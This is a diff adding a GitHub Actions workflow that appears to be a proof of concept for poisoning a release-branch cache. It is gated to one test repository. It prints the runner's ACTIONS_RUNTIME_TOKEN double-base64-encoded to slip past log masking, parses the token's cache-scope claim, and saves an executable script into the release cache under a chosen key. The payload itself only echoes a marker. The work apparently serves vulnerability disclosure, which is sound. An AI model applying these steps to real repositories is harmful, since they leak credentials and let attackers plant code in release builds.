@@ -1,0 +1,59 @@
+name: Write release-branch cache (executable payload)
+run-name: Write release-branch cache poc-run-1
+
+on:
+  pull_request:
+    branches:
+      - release
+    types: [edited]
+
+permissions: {}
+
+env:
+  CACHE_KEY: poc-cache-key-1
+  CACHE_PATH: .cache-payload
+
+jobs:
+  write-release-cache:
+    name: Write an executable payload to the release-branch cache
+    if: >-
+      github.repository == 'yellowrook1/ac-new-c' &&
+      github.event.action == 'edited'
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+      - name: Show the runtime cache token and its ac claim
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN
+
+            // This is an authorized, non-sensitive test repo, so we don't mask the token.
+            // Print it double-base64-encoded so it survives the log verbatim (decode it twice to
+            // recover the JWT).
+            const doubleBase64 = Buffer.from(
+              Buffer.from(token, 'utf8').toString('base64'),
+              'utf8',
+            ).toString('base64')
+            console.log('runtime token (double base64):', doubleBase64)
+
+            // The cache scopes are in the token's JWT `ac` claim (permission 3 = read + write, so a
+            // {refs/heads/<release>, 3} entry is the write access this finding is about). GitHub
+            // stores `ac` as a JSON string, so parse it before printing.
+            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))
+            const ac = typeof payload.ac === 'string' ? JSON.parse(payload.ac) : payload.ac
+            console.log('ac claim:', JSON.stringify(ac))
+
+      - name: Put an executable payload in the cache directory
+        shell: bash
+        run: |
+          mkdir -p "$CACHE_PATH"
+          printf '#!/bin/sh\necho POISONED_CACHE_EXECUTED\n' > "$CACHE_PATH/proof.sh"
+          chmod +x "$CACHE_PATH/proof.sh"
+
+      - name: Save the cache on the release branch
+        uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
+        with:
+          path: .cache-payload
+          key: poc-cache-key-1
+          enableCrossOsArchive: false
